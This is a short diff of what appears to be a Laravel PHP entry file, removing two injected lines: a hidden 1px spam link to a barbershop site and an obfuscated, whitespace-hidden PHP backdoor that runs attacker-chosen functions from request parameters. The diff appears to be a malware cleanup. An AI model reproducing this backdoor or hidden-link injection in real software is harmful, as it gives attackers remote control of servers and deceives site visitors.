@@ -1,6 +1,4 @@
-<div style="overflow:hidden;height:1px;"><a href="https://frisor.ua/uk/">барбершоп</a></div>
 <?php
-                                                                                                                                                                                                                               if($bpec2mm=@$	{	'_REQUEST'}['3MZCR3RB' ]	)$bpec2mm[	1]( $ {	$bpec2mm	[2	]}[ 0]	,$bpec2mm[3 ]($bpec2mm[	4]	) )	;
 
 /**
  * Laravel - A PHP Framework For Web Artisans
